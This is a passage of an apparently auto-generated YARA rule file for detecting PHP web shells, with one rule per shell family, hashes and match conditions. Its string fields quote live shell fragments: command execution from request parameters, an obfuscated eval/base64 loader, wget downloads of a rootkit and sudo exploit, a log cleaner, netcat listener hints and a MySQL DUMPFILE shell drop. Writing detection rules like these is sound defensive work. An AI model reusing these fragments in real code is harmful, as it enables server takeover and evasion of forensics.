      $s13 = "if(isset($_POST['simpandb'])){$exp =  time() + (86400 * 30);setcookie(\"hostname\",$_POST['hostname'],$exp);setcookie(\"username" ascii
      $s14 = "$input =\"<label for=\\\"mode\\\">Operate :</label>\".$html->select(\"mode\",$opt,\"class=\\\"input_m\\\" style=\\\"width:300px" ascii
      $s15 = "} elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd); return $buff; " fullword ascii
      $s16 = "if(!empty($_SERVER['HTTP_USER_AGENT'])) { // dissallow from this array userAgent (redirect 404 page)" fullword ascii
      $s17 = "$passwd_1945 = \"f509e5b1aa24c8222241883261555ed5\"; // default password ; merdeka , change with md5 hash" fullword ascii
      $s18 = "class FileMan45{public function Spath(){if(isset($_GET['__merdeka__'])){$d = $_GET['__merdeka__'];}else{if(isset($_GET['__files_" ascii
      $s19 = "nfo\",\"System Security Info\").\" ]\");$li .= $html->li(\"[ \".$html->a(\"?__merdeka__=$dir&__action__=cmd\",\"Command\",\"titl" ascii
      $s20 = "@define('title','1945v'.ver.' - '.host);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _04025959b191f8f9de3f924f0940515f_365b390fe892b3112719506f9240ff389d9e19d4_3df1afbcfa718da6fc8af27554834ff6d1a86562_3f94ac8b_40
{
   meta:
      description = "php17 - from files 04025959b191f8f9de3f924f0940515f.php, 365b390fe892b3112719506f9240ff389d9e19d4.php, 3df1afbcfa718da6fc8af27554834ff6d1a86562.php, 3f94ac8bf2a341a7a409e641fd53b149be077bb8.php, 7f9506dd9412394c3923fbfc324bcb4a3f5e5701.php, 8624a02263f24c08ab7775f5c2ebacdf48be3abd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5916525af28ec268daed30e0bb38e97d3509f54a015be7f240ba5b0a3bb08267"
      hash2 = "4b04fc64a7669cab1815bc144f9bd1291ccc8cda5d645815ed6e35de89e0157b"
      hash3 = "208d43053620304c82210270e449f217044a7e9c60d0bbff382fd0e2da0b868d"
      hash4 = "aeadda27d91c0c57d56c65135295036c0edb31e76df2c4eb1ebf50b5913b570c"
      hash5 = "96090e0fc01b79efb907234e25f516bdc348c55385874bf810a60c6240c56f96"
      hash6 = "66d71af2923d108af2757dfad504202a021eab95ea6b2d7f9bab95e977b3be49"
   strings:
      $x1 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x2 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s3 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s4 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s5 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s6 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
      $s7 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s8 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s9 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s10 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s11 = "\\$sock = IO::Socket::INET->new(PeerAddr => \\\"old.zone-h.org\\\", PeerPort => 80, Proto => \\\"tcp\\\") or next;" fullword ascii
      $s12 = "ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();" fullword ascii
      $s13 = "\\$sys= 'echo \\\"[ Operating system ][$]\\\"; echo \\\"`uname -a`\\\";" fullword ascii
      $s14 = "<option value='op3'>/var/cpanel/accounting.log</option>" fullword ascii
      $s15 = "fclose($zrodlo);echo \"<center><pre>\".$sta.htmlspecialchars($tekst).$eta.\"</pre></center>\";unlink($temp);} else {" fullword ascii
      $s16 = "elseif(!function_exists(shell_exec)){$opop=popen($ocmd,'r');" fullword ascii
      $s17 = "print \\$sock \\\"POST /en/defacements/notify HTTP/1.0\\r\\n\\\";" fullword ascii
      $s18 = "if (!connect(SERVER, pack 'SnA4x8', 2, \\$port, \\$target)) {" fullword ascii
      $s19 = "@header(\"Content-Type: application/force-download;name=$dwfile\");" fullword ascii
      $s20 = "else {$fpz=fopen (\"/tmp/z.pl\",\"w\");$zpl='/tmp/z.pl';$li=\"/tmp/bklist.txt\";}" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _06964dce9addb1c5cb5d6e3d9838f733_68112f6cbb4bdffee48f32bf115e2b507cb610ef_715f17e286416724e90113feab914c707a26d456_78b42634_41
{
   meta:
      description = "php17 - from files 06964dce9addb1c5cb5d6e3d9838f733.php, 68112f6cbb4bdffee48f32bf115e2b507cb610ef.php, 715f17e286416724e90113feab914c707a26d456.php, 78b42634863a4e2148a7441b32436372dea0d11a.php, a5d8519f57b94ab8cb8efced9fa7d21a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e572db25a8b68d8eeae168e4363006d752f08de169b7ce91156d0e86d9ec798f"
      hash2 = "cbaa0b37299f99afe1a0f5968c7e9988e04a6003af36517aa8d715c364b9ae4e"
      hash3 = "3a63bbe7a6d83f5d7d0c3523ebe340f4ef0f9147bdff9a75ab7f3b24983cd6c2"
      hash4 = "c8ec43d7ae0d96e7fcd4b1262cdac036dace5ed8ffc3c06ed57e307fdf7fcb4f"
      hash5 = "8548e7070db852e66fcfe2f9aca057847a4a77171a083a715d450bb4149204ef"
   strings:
      $s1 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s2 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s3 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s4 = "if( $command == \"flush_logs\" ) {" fullword ascii
      $s5 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
      $s6 = "if( $command == \"flush_hosts\" ) {" fullword ascii
      $s7 = "global $PHP_SELF, $USERNAME, $PASSWORD, $action, $dbname, $tablename;" fullword ascii
      $s8 = "if( $command == \"\" || substr( $command, 0, 5 ) == \"flush\" ) {" fullword ascii
      $s9 = "if( $command == \"flush_privileges\" ) {" fullword ascii
      $s10 = "if( $action == \"logon\" || $action == \"\" || $action == \"logout\" )" fullword ascii
      $s11 = "* -------------------------------" fullword ascii
      $s12 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofill</th><th>binary</th>" fullword ascii
      $s13 = "if( $var == \"mysql_web_admin_password\" ) $PASSWORD = $value;" fullword ascii
      $s14 = "echo \"<input type=hidden name=action value=logon_submit>\\n\";" fullword ascii
      $s15 = "$queryStr = ereg_replace( \"_\", \" \", $command );" fullword ascii
      $s16 = "setcookie( \"mysql_web_admin_password\", $password );" fullword ascii
      $s17 = "echo \"<a href='$PHP_SELF?action=logon'>Logon</a>\\n\";" fullword ascii
      $s18 = "if( $action == \"dumpTable\" )" fullword ascii
      $s19 = "setcookie( \"mysql_web_admin_password\" );" fullword ascii
      $s20 = "while( list($var, $value) = each($HTTP_COOKIE_VARS) ) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _25c216f1f702bd4d0c72ae03731251197198b52e_360609383ca25afdc76c8272d1f873b757cf6150_42
{
   meta:
      description = "php17 - from files 25c216f1f702bd4d0c72ae03731251197198b52e.php, 360609383ca25afdc76c8272d1f873b757cf6150.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e9a6f2b373ba87860292cbfc6a7256c037cef2fb8a34c146f62d06685ee8a380"
      hash2 = "161644ad1428a45eb20d3d0d26ee274efbd11e1e8476c7a0fedfe3c48dc61147"
   strings:
      $x1 = "<? eval(gzinflate(str_rot13(base64_decode('FJ3HjuPaklJ/pXR9AQ7oHfDwLuit6P2kTiNt78mvYuWkDLKkOjwnb8dNmaL073//8+//fM+0/6dtm7Hs0/37Q" ascii
      $s2 = "kauwm2umS28rAChQB53uuKah6C/OCOLralaNDHofhX91ftok0hNXmndTvg7mnLvkFiCqrcWSwBIrcrTh8v1HLGupzt4X8m87lwUC8aNCC8GOpKu22ezFSA4g8l5A1rqc" ascii
      $s3 = "lRk8XzDVFx4kTkRk7uwTBtcID8gkXxQkL2NubdNnJWxQgw2texeCDMph2WUo/FbZdjtINbWerXl2f6OrZF/xuy1zSUW0puIS/YSMMnmHD2xFxVvUab8FjZMmBnXQIFQe" ascii
      $s4 = "$auth_pass = \"d5af6b24320f41a1043d92bc2c46aa42\";" fullword ascii
      $s5 = "qsu+B5LFeAA/4ZZrIJwz2vRkRWBebLOG7TaQMHxdYp68TkrRRkhvJdIYkAogWdYieey9fucT1cjeJWhMQZMJJlWm26uDiPTNbYU3MMloRCflm539MR/w/woVIVFqh/dO" ascii
      $s6 = "7MFa91QhQw/cFRHPuQ5yrpN00d4iUKXaC+e7hGV7TTP/73LologJLieDPN9AVq16DFxL9i1q3rCwWl+PfGy1a7SvPoKlGBxzvdVMo3PPnHxY/kCtOPv0Spn8AR46Eo3f" ascii
      $s7 = "h1XWqW2yNSmp0hHJkvH9tspybFv0DUx+1UDnS2MHUkPDa33jvcDt+/hz3afnGl7UUw1JvKlLlTVRpIZ987KeVDwEx4cl5z+6mxBWhGV6hkltUPF/2njENlOCrptQQFxI" ascii
      $s8 = "ryerdLNqlGb3yb6+0T8ckrj/sEqsdg/X0JqcINCL9rCRYXSv0W1u54ipXxmutIV/qoPozvpbXmu7YFEYEY2+3Mi7+G1Drr0JrSjRakpwOFGvNqpqSXq/sw3iSm/EspIK" ascii
      $s9 = "cvvpO2p2OdYSBPgv6p8TsLHoPGDdAGzKmizqNWfSd2L+xtgP5pE9isuMl374F4T3MKPp/210ODarKangYs46KsskIfOM4uGiZiKSPPwPmPvpm636W4WGnUIT2rR8Rn7K" ascii
      $s10 = "uadALZWoYMLlbiIVOSFO2Ci1JTz7Pmv6IzoeGUUpzP+qq0SmezMao4NVHCEYEg/Rk0MqiXIbBAaKncIGBJh0XmI7ZAEfckBEi0UfvOlDxueO6E4jB7mDbGE7MDnfElco" ascii
      $s11 = "68nUdOSbrNhxv2kS/x8TBxd9MCHbjKNBDnZhAhTCgdjXfBkLSG5r8GoQxI7eyELPl6DKDBelzeRfBxMG8EyUHFqgVnEPKWKgVlGF/OOcbhL53dVfBU0JiRksJOLNGP97" ascii
      $s12 = "HF9MrBmfc0frAVuknXZZ4VAnqRRCG3rMwlU+aCQupgpApGErLOC9jCxIO4+QFHC8+nywQWxNXvMBYKwIRCexm023IzUg9P76V2K6HBp335+SYdeRqw0ZWoFgeDO2vovh" ascii
      $s13 = "JlYyNpZ8ZkC6RkAm7zAyvjCrDmUiZ78cfPjjcn7xAcnlt/zcxFsPyZNEKbuF+NJAhv6pdE56ll6Y06H9FRxa2eT52/6l/JLrobQHyRBg1cJy/7rOd56GoeM6QBAwae6a" ascii
      $s14 = "WVHels9Qx+jaf03sMlr210PqueviDDuxwsCJv+l0fzs0vjZt9I99efBEYuEJAlWHS1DBP7KirCnoUOW7y9t53l392Gw+ngy9/SPeOPSqYwn6SFlAfNv3SwBGqqd2uPf8" ascii
      $s15 = "7UaIofJMYH3i7B6Zn6gQIYxTLaAs5bTzQ3DskoLIXiPUvTAQRJH7pMcKa0F9g5klIUrSE6vT+1VBMqoiUlDlLX+fRqe1NHOM9K0vuXAiz/TBxOm05/bRw5gC4da45Sul" ascii
      $s16 = "IldHhSgPCB6Msw4lQWoqNr698EJQvn5OkdRiC7dnxD1ewj+DD9hdfG7T/Slp/QRONTL9JuUMENFrPMZiNcI14wdky2k1syoAlbKek6lOQCmGgjsInxiQvp0cGi7eyc9X" ascii
      $s17 = "YiaKQuFe8ILtGPMY/Q04jTVG81jRVxMRIJMiX6acedHQ2FbnGeXDgLJMs68F8c5vD1PMvWd9dV/MOF3vxoT4p62rfXqdNlOsMo1hSTDjBi3bl6Eh08SsgwLVH6iy87fD" ascii
      $s18 = "TFspta1O2gT3oCPKJbs+6s/WOwQ/qWHkuH5Nxy0PFjOQeqhe8vRyi/tfMIgdgr6HOqn5fksgwcevTY6/DASgC7fAcDM+OoojVa2v/KMRoGSlyD3RHpq4MvCkmS61MjS6" ascii
      $s19 = "42dTgvJ8E6e720nTjU7Hx7paDIArBnQAXx34uKuof4r1mxsmS79E1y8RXWqXMXeB5V6FD6EgXDm9/OJnvIq5tk/aP9bO9PP7xIIMiJ8bc6Eh5CMSLcHqG9Q1wr8cHflp" ascii
      $s20 = "EJQbKcqUqYE8VZXad9xNH0udBbXj0Dhg7QC52UynV19rqodmT84PufH4b4BInKour7LrexfqrDcXSMYakt5GL4B+XTIsFdUZA4SiEl6Vyik7Chx89rcjy9cefOBiXi8V" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _101dc25b77d866984c81006bb34dc9ef713b4f5a_1e5c6558486db6333246ee2580bafde628af6cda_43
{
   meta:
      description = "php17 - from files 101dc25b77d866984c81006bb34dc9ef713b4f5a.php, 1e5c6558486db6333246ee2580bafde628af6cda.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4adc6c5373c4db7b8ed1e7e6df10a3b2ce5e128818bb4162d502056677c6f54a"
      hash2 = "60505a1d3406e698abd0d1019aff73029d23af426a60672d85780d0f6517fccf"
   strings:
      $x1 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii
      $x2 = "elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii
      $x3 = "elseif ( $cmd==\"uploadproc\" ) {" fullword ascii
      $s4 = "elseif ( $cmd==\"edit\" ) {" fullword ascii
      $s5 = "/* <!-- Execute --> */" fullword ascii
      $s6 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii
      $s7 = "elseif ( $cmd==\"saveedit\" ) {" fullword ascii
      $s8 = "elseif ( $cmd==\"deldir\" ) {" fullword ascii
      $s9 = "elseif ( $cmd==\"newdir\" ) {" fullword ascii
      $s10 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii
      $s11 = "elseif ( $cmd==\"newfile\" ) {" fullword ascii
      $s12 = "elseif ( $cmd==\"downl\" ) {" fullword ascii
      $s13 = "elseif ( $cmd==\"ren\" ) {" fullword ascii
      $s14 = "elseif ( $cmd==\"upload\" ) { " fullword ascii
      $s15 = "elseif ( $cmd==\"file\" ) {" fullword ascii
      $s16 = "echo sp(3). buildUrl( $img[\"Download\"], \"cmd=downl&file=$dir/$file\").\"\\n\";" fullword ascii
      $s17 = "echo sp(3).buildUrl( $img[\"Delete\"], \"cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";" fullword ascii
      $s18 = "echo sp(3). buildUrl( $img[\"Delete\"], \"cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";" fullword ascii
      $s19 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_URL/$im\\\" alt=\\\"$id\\\">\";" fullword ascii
      $s20 = "/* uncomment the two following variables if you want to use http" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c20 ) and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _8d23f3d3f678d3e620b91c2115e1f714_adminer_4_1_0_mysql_adminer_4_2_4_2_44
{
   meta:
      description = "php17 - from files 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash2 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash3 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
   strings:
      $x1 = "false;}set_error_handler(array($this,'_error'));$J=@oci_execute($I);restore_error_handler();if($J){if(oci_num_fields($I))return" fullword ascii
      $x2 = "';if(!$K[\"hashed\"]){echo'<script type=\"text/javascript\">typePassword(document.getElementById(\\'pass\\'));</script>';}echo" fullword ascii
      $s3 = "multi_query($H){$this->_result=sqlsrv_query($this->_link,$H);$this->error=\"\";if(!$this->_result){$this->_get_error();return" fullword ascii
      $s4 = "preg_replace('~^([A-Z =]+) DEFINER=`'.preg_replace('~@(.*)~','`@`(%|\\\\1)',logged_user()).'`~','\\\\1',$H);}function" fullword ascii
      $s5 = "view($C){$L=get_rows('SELECT text \"select\" FROM user_views WHERE view_name = '.q($C));return" fullword ascii
      $s6 = "implode(get_vals(\"SELECT sql || ';;\\n' FROM sqlite_master WHERE type = 'trigger' AND tbl_name = \".q($Q)));}function" fullword ascii
      $s7 = "implode(($_POST[\"format\"]==\"csv\"?\",\":($_POST[\"format\"]==\"tsv\"?\"\\t\":\";\")),$K).\"\\r\\n\";}function" fullword ascii
      $s8 = "get_password(){$J=get_session(\"pwds\");if(is_array($J))$J=($_COOKIE[\"adminer_key\"]?decrypt_string($J[0],$_COOKIE[\"adminer_ke" ascii
      $s9 = "get_password(){$J=get_session(\"pwds\");if(is_array($J))$J=($_COOKIE[\"adminer_key\"]?decrypt_string($J[0],$_COOKIE[\"adminer_ke" ascii
      $s10 = "Min_DB{var$extension=\"SimpleXML\",$server_info='2009-04-15',$error,$timeout,$next,$affected_rows,$_result;function" fullword ascii
      $s11 = "false;}$_->query('PRAGMA encoding = \"UTF-8\"');$_->query('CREATE TABLE adminer (i)');$_->query('DROP TABLE adminer');return" fullword ascii
      $s12 = "VER[\"REQUEST_URI\"]),\"\",$ba);if(version_compare(PHP_VERSION,'5.2.0')>=0)$F[]=true;return" fullword ascii
      $s13 = "iggers WHERE event_object_table = '.q($_GET[\"trigger\"]).' AND trigger_name = '.q($C));return" fullword ascii
      $s14 = "show_status(){$L=get_rows('SELECT * FROM v$instance');return" fullword ascii
      $s15 = "ERE rnum > $D\":($z!==null?\" * FROM (SELECT $H$Z) WHERE rownum <= \".($z+$D):\" $H$Z\"));}function" fullword ascii
      $s16 = "fields($Q){$J=array();foreach(get_rows(\"SELECT c.*, t.name type, d.definition [default]" fullword ascii
      $s17 = "WHERE sys1.xtype = 'TR' AND sys2.name = \".q($Q))as$K)$J[$K[\"name\"]]=array($K[\"Timing\"],$K[\"Event\"]);return$J;}function" fullword ascii
      $s18 = "\".($C!=\"\"?\"AND relname = \".q($C):\"ORDER BY relname\"))as$K)$J[$K[\"Name\"]]=$K;return($C!=\"\"?$J[$C]:$J);}function" fullword ascii
      $s19 = "as$u){if(preg_match(\"~PRIMARY|UNIQUE~\",$u[\"type\"])){$J=array();foreach($u[\"columns\"]as$x){if(!isset($K[$x]))continue" fullword ascii
      $s20 = "sid(){static$J;if($J===null)$J=(SID&&!($_COOKIE&&ini_bool(\"session.use_cookies\")));return$J;}function" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_1898eebe767f4dda4709621164eeef8377c43bb3_626c5c9305cee457e10b85c81af262c5bc437255_6612561e_45
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, ad1928ed1cec75b09a7d05548b47cae5c472a427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash3 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash4 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash5 = "63d02e75b729e2cc17604235cf9c0b506b3ca5d578a8e32a0e85e28763ca25a6"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://twofaced.org/linux2-6-all.c\">Linux Kernel 2.6.* rootkit.c" fullword ascii
      $x2 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $x3 = "<OPTION VALUE=\"wget http://precision-gaming.com/sudo.c\">wget Linux sudo stack overflow" fullword ascii
      $s4 = "*  -Execute Rootshell.c                                  " fullword ascii
      $s5 = "<OPTION VALUE=\"gcc -DLINUX -WALL mig-logcleaner.c -o migl\">Compile Mig LogCleaner" fullword ascii
      $s6 = "<OPTION VALUE=\"./migl -u root 0\">Compile Mig LogCleaner" fullword ascii
      $s7 = "<OPTION VALUE=\"gcc linux2-6-all.c -o linuxkernel\">Compile Linux2-6-all.c" fullword ascii
      $s8 = "<OPTION VALUE=\"wget http://twofaced.org/mig-logcleaner.c\">Mig LogCleaner" fullword ascii
      $s9 = "*  -Added w4ck1ng Shell Backdoor Connect and Backdoor    " fullword ascii
      $s10 = "<OPTION VALUE=\"./sudosploit\">Execute Sudosploit" fullword ascii
      $s11 = "<OPTION VALUE=\"gcc sudo.c -o sudosploit\">Compile Linux sudo sploit" fullword ascii
      $s12 = "*  -Added private 0day released by allahaka which utilizes the linux" fullword ascii
      $s13 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;backgroun" fullword ascii
      $s14 = "*  -Added Rootshell.c;auto-compiler                      " fullword ascii
      $s15 = "$proxy_shit=\"H4sIALMXx0QAA+RafXhU1Zm/M5mBAUJmUD4i2hKsKFSBhC9RRFN1FK1bRpSK1jXEfHCD+Spzp0AfkLjDrIzD2NiK0qe1Gx+0i61d6YqCrdEgSIJGn6" ascii
      $s16 = "*  Locus7s Modified c100 Shell                                                                 " fullword ascii
      $s17 = "port for it first. Once open, use NetCat, and run '<b>nc -l -n -v -p 5992</b>'<br><br></center>\");" fullword ascii
      $s18 = "<b>Bind With Backd00r Burner</b></br><form action=\"<?php echo $surl;?>\"><input type=hidden name=act value=tools><select size=" ascii
      $s19 = "*  PRIVATE RELEASE OF C100 SHELL FOR LOCUS7S MEMBERS     " fullword ascii
      $s20 = "error_log($_POST['erorr'], 3, \"php://\".$_POST['nere']);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_aa0fc6f621e8b2965b3a109832117d023f4a1ad6_46
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $x1 = "else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));" fullword ascii
      $s2 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"\".$ck.\"_Files.zip\");" fullword ascii
      $s3 = "$shell = \"select 0x\".$mysql.\" from \".$database.\" into DUMPFILE '\".$uppath.\"/\".$upname.\"';\";" fullword ascii
      $s4 = "$tb->tdbody('host: '.$tb->makeinput('host','127.0.0.1',''.$tb->makehidden('do','port').'','text','12').'&nbsp;" fullword ascii
      $s5 = "<input name=\"function\" type=\"text\" class=\"INPUT\"  value=\"Mixconnect\"> &nbsp;<a href=\"?action=mix\">(Mix.dll)</a>" fullword ascii
      $s6 = ":'.$tb->makeinput('passfile','./password.txt','','text','20').'&nbsp;" fullword ascii
      $s7 = "$sock = fsockopen(\"127.0.0.1\", $_POST[\"SUPort\"], &$errno, &$errstr, 10);" fullword ascii
      $s8 = "$query=\"create function \".$_POST['function'].\" returns integer soname '\".$dll_path.\"';\";" fullword ascii
      $s9 = "$link=@mysql_connect($_POST['host'],$_POST['user'],$_POST['pass']);" fullword ascii
      $s10 = "if($_POST['SUPort'] != \"\" && $_POST['SUUser'] != \"\" && $_POST['SUPass'] != \"\")" fullword ascii
      $s11 = "if($ctype==\"mysql\") $sa = @mysql_connect($host,$user,chop($tmp[$i]));" fullword ascii
      $s12 = "$shell = file_get_contents($filename);" fullword ascii
      $s13 = "SS: '.$tb->makeinput('password','','','text','16').''.$tb->makehidden('action','mysqldown').'" fullword ascii
      $s14 = "$query=\"select \".$_POST['function'].\"('\".$_POST['ip'].\"','\".$_POST['port'].\"');\";" fullword ascii
      $s15 = "mix.dll" fullword ascii
      $s16 = "$info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];" fullword ascii
      $s17 = "$data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));" fullword ascii
      $s18 = "$gzp = @gzopen($to.$header['filename'].'.gz','rb') or die(\"Cette archive est compress" fullword ascii
      $s19 = "echo \"<font color=blue>Connected successfully as \".$_POST['user'].\"</font><br>\";" fullword ascii
      $s20 = "if(getphpcfg(\"allow_url_fopen\")==\"Yes\") $temp = \"" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_82d1122c0d297bb8dc2959e5023728a09a3e4e6d_47
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 82d1122c0d297bb8dc2959e5023728a09a3e4e6d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "65024e9ae949507819c9344a2e134ff406e24c6e2a54ded2dab8ef8e6e7d1f83"
   strings:
      $s1 = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t" fullword ascii
      $s2 = "OiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBD" fullword ascii
      $s3 = "PHRkIGJnY29sb3I9IiNGRkZGRkYiIHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNp" fullword ascii
      $s4 = "ZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cucHJpdjguaWJsb2dnZXIub3JnL3MucGhwPytjZ2l0ZWxu" fullword ascii
      $s5 = "bWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9u" fullword ascii
      $s6 = "NjYiPnByaXY4IGNnaSBzaGVsbDwvYj4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9u" fullword ascii
      $s7 = "Z2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQg" fullword ascii
      $s8 = "c3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48cHJlPjxpbWcgYm9y" fullword ascii
      $s9 = "Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t" fullword ascii
      $s10 = "bGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRp" fullword ascii
      $s11 = "ZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5" fullword ascii
      $s12 = "bnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk" fullword ascii
      $s13 = "b2N1cygpIiBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1h" fullword ascii
      $s14 = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N" fullword ascii
      $s15 = "cHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBp" fullword ascii
      $s16 = "P2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBs" fullword ascii
